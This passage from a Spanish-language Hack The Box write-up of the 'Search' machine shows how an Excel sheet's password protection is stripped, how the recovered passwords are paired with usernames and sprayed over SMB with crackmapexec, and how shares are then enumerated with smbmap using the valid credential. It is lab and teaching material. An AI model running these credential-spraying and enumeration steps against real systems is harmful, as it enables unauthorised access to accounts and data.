class="o">&gt;</span>&lt;v&gt;30&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C9"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;48&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f&gt;A9&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B9&lt;/f&gt;&lt;v&gt;Sierra.Frye&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"10"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;18&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;19&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C10"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;39&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Annabelle.Wells&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"11"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;20&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;21&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;40&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Eve.Galvan&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"12"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;22&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;23&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;41&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Jeramiah.Fritz&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"13"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;24&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;25&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;42&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Abby.Gonzalez&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"14"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;26&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;11&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;43&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Joy.Costa&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"15"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;27&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;28&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;47&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Vincent.Sutton&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"17"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"3:3"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C17"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"4"</span>/&gt;&lt;/row&gt;&lt;/sheetData&gt;&lt;pageMargins <span class="nv">left</span><span class="o">=</span><span class="s2">"0.7"</span> <span class="nv">right</span><span class="o">=</span><span class="s2">"0.7"</span> <span class="nv">top</span><span class="o">=</span><span class="s2">"0.75"</span> <span class="nv">bottom</span><span class="o">=</span><span class="s2">"0.75"</span> <span class="nv">header</span><span class="o">=</span><span class="s2">"0.3"</span> <span class="nv">footer</span><span class="o">=</span><span class="s2">"0.3"</span>/&gt;&lt;pageSetup <span class="nv">paperSize</span><span class="o">=</span><span class="s2">"9"</span> <span class="nv">orientation</span><span class="o">=</span><span class="s2">"portrait"</span> r:id<span class="o">=</span><span class="s2">"rId1"</span>/&gt;&lt;/worksheet&gt;
</code></pre></div></div>

<ul>
  <li>Ahora generamos otro comprimido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  document <span class="nb">rm</span> <span class="nt">-r</span> Phishing_Attempt.xlsx
➜  document zip Docu.xlsx <span class="nt">-r</span> <span class="nb">.</span>
  adding: _rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: _rels/.rels <span class="o">(</span>deflated 60%<span class="o">)</span>
  adding: xl/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/_rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/_rels/workbook.xml.rels <span class="o">(</span>deflated 74%<span class="o">)</span>
  adding: xl/drawings/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/drawings/_rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/drawings/_rels/drawing1.xml.rels <span class="o">(</span>deflated 39%<span class="o">)</span>
  adding: xl/drawings/drawing1.xml <span class="o">(</span>deflated 58%<span class="o">)</span>
  adding: xl/worksheets/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/worksheets/_rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/worksheets/_rels/sheet2.xml.rels <span class="o">(</span>deflated 42%<span class="o">)</span>
  adding: xl/worksheets/_rels/sheet1.xml.rels <span class="o">(</span>deflated 55%<span class="o">)</span>
  adding: xl/worksheets/sheet2.xml <span class="o">(</span>deflated 73%<span class="o">)</span>
  adding: xl/worksheets/sheet1.xml <span class="o">(</span>deflated 79%<span class="o">)</span>
  adding: xl/workbook.xml <span class="o">(</span>deflated 60%<span class="o">)</span>
  adding: xl/styles.xml <span class="o">(</span>deflated 89%<span class="o">)</span>
  adding: xl/printerSettings/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/printerSettings/printerSettings1.bin <span class="o">(</span>deflated 67%<span class="o">)</span>
  adding: xl/printerSettings/printerSettings2.bin <span class="o">(</span>deflated 67%<span class="o">)</span>
  adding: xl/sharedStrings.xml <span class="o">(</span>deflated 55%<span class="o">)</span>
  adding: xl/charts/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/charts/_rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/charts/_rels/chart1.xml.rels <span class="o">(</span>deflated 49%<span class="o">)</span>
  adding: xl/charts/style1.xml <span class="o">(</span>deflated 90%<span class="o">)</span>
  adding: xl/charts/chart1.xml <span class="o">(</span>deflated 77%<span class="o">)</span>
  adding: xl/charts/colors1.xml <span class="o">(</span>deflated 73%<span class="o">)</span>
  adding: xl/theme/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/theme/theme1.xml <span class="o">(</span>deflated 80%<span class="o">)</span>
  adding: xl/calcChain.xml <span class="o">(</span>deflated 55%<span class="o">)</span>
  adding: <span class="o">[</span>Content_Types].xml <span class="o">(</span>deflated 79%<span class="o">)</span>
  adding: docProps/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: docProps/app.xml <span class="o">(</span>deflated 52%<span class="o">)</span>
  adding: docProps/core.xml <span class="o">(</span>deflated 47%<span class="o">)</span>
  adding: .~lock.Phishing_Attempt.xlsx# <span class="o">(</span>deflated 1%<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora lo abrimos de nuevo.</p>
  </li>
  <li>
    <p>Y vemos que ya no tenemos el candado.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/9.png" />
</p>

<ul>
  <li>Las contraseñas están en la <strong>C</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/10.png" />
</p>

<ul>
  <li>Tenemos un listado potencial de usuarios y contraseñas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  new <span class="nb">cat </span>users.txt
Payton.Harmon
Cortez.Hickman
Bobby.Wolf
Margaret.Robinson
Scarlett.Parks
Eliezer.Jordan
Hunter.Kirby
Sierra.Frye
Annabelle.Wells
Eve.Galvan
Jeramiah.Fritz
Abby.Gonzalez
Joy.Costa
Vincent.Sutton
➜  new nano creds.txt
➜  new <span class="nb">cat </span>creds.txt
<span class="p">;;</span>36!cried!INDIA!year!50<span class="p">;;</span>
..10-time-TALK-proud-66..
??47^before^WORLD^surprise^91??
//51+mountain+DEAR+noise+83//
++47|building|WARSAW|gave|60++
<span class="o">!!</span>05_goes_SEVEN_offer_83!!
~~27%when%VILLAGE%full%00~~
<span class="nv">$$49</span><span class="o">=</span><span class="nv">wide</span><span class="o">=</span><span class="nv">STRAIGHT</span><span class="o">=</span><span class="nv">jordan</span><span class="o">=</span>28<span class="nv">$$</span>18
<span class="o">==</span>95~pass~QUIET~austria~77<span class="o">==</span>
//61!banker!FANCY!measure!25//
??40:student:MAYOR:been:66??
<span class="o">&amp;&amp;</span>75:major:RADIO:state:93&amp;&amp;
<span class="k">**</span>30<span class="k">*</span>venus<span class="k">*</span>BALL<span class="k">*</span>office<span class="k">*</span>42<span class="k">**</span>
<span class="k">**</span>24&amp;moment&amp;BRAZIL&amp;members&amp;66<span class="k">**</span>
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> pero vamos hacer que para cada usuario pruebe la contraseña tipo primero la 1 primer contraseña del archivo para el primer usuario después para el segundo usuario la 2 contraseña de la lista etc. Tenemos que indicarle el siguiente parámetro <code class="language-plaintext highlighter-rouge">--no-bruteforce</code> para que no vaya probando 1 contraseña para todos los usuarios y a si sucesivamente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  new crackmapexec smb 10.129.229.57 <span class="nt">-u</span> users.txt <span class="nt">-p</span> creds.txt <span class="nt">--no-bruteforce</span> <span class="nt">--continue-on-success</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\P</span>ayton.Harmon:<span class="p">;;</span>36!cried!INDIA!year!50<span class="p">;;</span> STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\C</span>ortez.Hickman:..10-time-TALK-proud-66.. STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\B</span>obby.Wolf:??47^before^WORLD^surprise^91?? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\M</span>argaret.Robinson://51+mountain+DEAR+noise+83// STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>carlett.Parks:++47|building|WARSAW|gave|60++ STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\E</span>liezer.Jordan:!!05_goes_SEVEN_offer_83!! STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\H</span>unter.Kirby:~~27%when%VILLAGE%full%00~~ STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\S</span>ierra.Frye:<span class="nv">$$49</span><span class="o">=</span><span class="nv">wide</span><span class="o">=</span><span class="nv">STRAIGHT</span><span class="o">=</span><span class="nv">jordan</span><span class="o">=</span>28<span class="nv">$$</span>18
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>nnabelle.Wells:<span class="o">==</span>95~pass~QUIET~austria~77<span class="o">==</span> STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\E</span>ve.Galvan://61!banker!FANCY!measure!25// STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\J</span>eramiah.Fritz:??40:student:MAYOR:been:66?? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>bby.Gonzalez:&amp;&amp;75:major:RADIO:state:93&amp;&amp; STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\J</span>oy.Costa:<span class="k">**</span>30<span class="k">*</span>venus<span class="k">*</span>BALL<span class="k">*</span>office<span class="k">*</span>42<span class="k">**</span> STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\V</span>incent.Sutton:<span class="k">**</span>24&amp;moment&amp;BRAZIL&amp;members&amp;66<span class="k">**</span> STATUS_LOGON_FAILURE
</code></pre></div></div>

<h2 id="shell-as-sierrafrye">Shell as sierra.frye</h2>

<ul>
  <li>Vamos a validarlas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb search.htb <span class="nt">-u</span> Sierra.Frye <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--continue-on-success</span>
SMB         search.htb      445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         search.htb      445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\S</span>ierra.Frye:<span class="nv">$$49</span><span class="o">=</span><span class="nv">wide</span><span class="o">=</span><span class="nv">STRAIGHT</span><span class="o">=</span><span class="nv">jordan</span><span class="o">=</span>28<span class="nv">$$</span>18
</code></pre></div></div>

<ul>
  <li>Ahora vamos a listar recursos pero ahora con este usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="err">$</span>
	dr--r--r--                0 Sun Apr  7 17:54:11 2024	<span class="nb">.</span>
	dr--r--r--                0 Sun Apr  7 17:54:11 2024	..
	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="err">$</span>
	dr--r--r--                0 Sun Apr  7 17:54:11 2024	<span class="nb">.</span>
	dr--r--r--                0 Sun Apr  7 17:54:11 2024	..
	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="err">$</span>
	dr--r--r--                0 Sun Apr  7 17:54:11 2024	<span class="nb">.</span>
	dr--r--r--                0 Sun Apr  7 17:54:11 2024	..
	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
